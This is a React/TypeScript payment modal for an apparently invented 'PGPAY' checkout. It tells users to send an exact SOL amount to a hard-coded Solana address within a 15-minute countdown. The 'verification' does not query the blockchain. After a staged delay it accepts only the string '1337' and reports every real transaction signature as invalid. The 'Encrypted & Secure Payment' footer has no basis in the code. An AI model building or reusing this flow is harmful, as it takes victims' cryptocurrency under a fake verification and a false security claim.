
import { useState, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Copy, Clock } from 'lucide-react';

interface PaymentModalProps {
  isOpen: boolean;
  onClose: () => void;
  onSuccess: () => void;
  amount: number;
  type: 'token' | 'liquidity';
}

const PaymentModal = ({ isOpen, onClose, onSuccess, amount, type }: PaymentModalProps) => {
  const [signature, setSignature] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [timeLeft, setTimeLeft] = useState(15 * 60); // 15 minutes in seconds
  const [currency] = useState('SOL');
  const [network] = useState('Solana');

  const recipientAddress = '7vN9GTLqn5HCEzzyVFrPTgeszdUTJ8bJ1sPaMNJAbx';

  useEffect(() => {
    if (!isOpen) return;
    
    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          onClose();
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [isOpen, onClose]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const copyToClipboard = async () => {
    try {
      await navigator.clipboard.writeText(recipientAddress);
    } catch (err) {
      console.error('Failed to copy to clipboard');
    }
  };

  const handlePayment = async () => {
    setIsProcessing(true);
    
    await new Promise(resolve => setTimeout(resolve, 1500));
    
    if (signature === '1337') {
      onSuccess();
    } else {
      alert('Invalid transaction signature. Please try again.');
    }
    
    setIsProcessing(false);
  };

  const handleBackdropClick = (e: React.MouseEvent) => {
    if (e.target === e.currentTarget) {
      onClose();
    }
  };

  if (!isOpen) return null;

  return (
    <div 
      className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4 animate-modal-in"
      onClick={handleBackdropClick}
    >
      <div className="bg-gray-900 rounded-2xl p-6 max-w-md w-full shadow-2xl animate-modal-scale border border-gray-700">
        {/* PGPAY Header */}
        <div className="flex items-center justify-between mb-6">
          <div className="flex items-center space-x-2">
            <div className="w-8 h-8 bg-blue-500 rounded-lg flex items-center justify-center">
              <span className="text-white font-bold text-sm">PG</span>
            </div>
            <span className="text-white font-bold text-xl">PGPAY</span>
          </div>
          <Button variant="outline" size="sm" className="text-gray-400 border-gray-600">
            Sign up
          </Button>
        </div>

        {/* Payment Amount */}
        <div className="mb-6">
          <h2 className="text-white text-xl font-semibold mb-1">Select currency</h2>
          <div className="text-white text-2xl font-bold">{amount.toFixed(6)} SOL</div>
        </div>

        {/* Network Selection */}
        <div className="mb-4">
          <div className="text-gray-400 text-sm mb-2">Select network</div>
          <div className="flex items-center text-gray-400 text-xs mb-4">
            <span className="mr-1">⚠️</span>
            <span>You pay network fee</span>
          </div>
        </div>

        {/* Timer */}
        <div className="flex items-center space-x-2 mb-6">
          <div className="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
          <span className="text-gray-400 text-sm">Expiration time</span>
          <div className="flex items-center space-x-1 text-green-400 font-mono">
            <Clock className="w-4 h-4" />
            <span>{formatTime(timeLeft)}</span>
          </div>
        </div>

        {/* Currency and Network Selectors */}
        <div className="space-y-4 mb-6">
          <div>
            <Select value={currency} disabled>
              <SelectTrigger className="bg-gray-800 border-gray-700 text-white">
                <div className="flex items-center space-x-2">
                  <div className="w-5 h-5 bg-blue-500 rounded-full flex items-center justify-center">
                    <span className="text-white text-xs font-bold">≡</span>
                  </div>
                  <SelectValue />
                </div>
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="SOL">SOL</SelectItem>
              </SelectContent>
            </Select>
          </div>

          <div>
            <Select value={network} disabled>
              <SelectTrigger className="bg-gray-800 border-gray-700 text-white">
                <div className="flex items-center space-x-2">
                  <div className="w-5 h-5 bg-purple-500 rounded-full flex items-center justify-center">
                    <span className="text-white text-xs font-bold">≡</span>
                  </div>
                  <SelectValue />
                </div>
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="Solana">Solana</SelectItem>
              </SelectContent>
            </Select>
          </div>
        </div>

        {/* Main Payment Button */}
        <Button
          className="w-full bg-green-500 hover:bg-green-600 text-black font-semibold py-3 mb-6 rounded-xl"
          onClick={() => window.open(`https://phantom.app/`, '_blank')}
        >
          Proceed to the payment
        </Button>

        {/* Send Details */}
        <div className="mb-6">
          <div className="text-gray-400 text-sm mb-2">Send exactly</div>
          <div className="text-white font-mono text-lg mb-3">{amount.toFixed(6)} SOL</div>
          
          <div className="text-gray-400 text-sm mb-2">address</div>
          <div className="flex items-center space-x-2 bg-gray-800 rounded-lg p-3">
            <code className="text-green-400 font-mono text-sm flex-1 break-all">
              {recipientAddress}
            </code>
            <Button
              variant="ghost"
              size="sm"
              onClick={copyToClipboard}
              className="text-gray-400 hover:text-white p-1"
            >
              <Copy className="w-4 h-4" />
            </Button>
          </div>
        </div>

        {/* Transaction Verification */}
        <div className="space-y-4 mb-6">
          <div>
            <Label className="text-gray-400 text-sm">Paste your transaction signature</Label>
            <Input
              value={signature}
              onChange={(e) => setSignature(e.target.value)}
              placeholder="Transaction signature"
              className="mt-2 bg-gray-800 border-gray-700 text-white rounded-lg"
            />
          </div>

          <Button
            onClick={handlePayment}
            disabled={!signature || isProcessing}
            className="w-full bg-green-500 hover:bg-green-600 text-black font-semibold rounded-lg"
          >
            {isProcessing ? 'Verifying...' : 'Check Transaction'}
          </Button>
        </div>

        {/* Footer */}
        <div className="text-center text-gray-500 text-xs">
          🔒 Encrypted & Secure Payment
          <br />
          By paying you agree to our terms of service
        </div>
      </div>
    </div>
  );
};

export default PaymentModal;
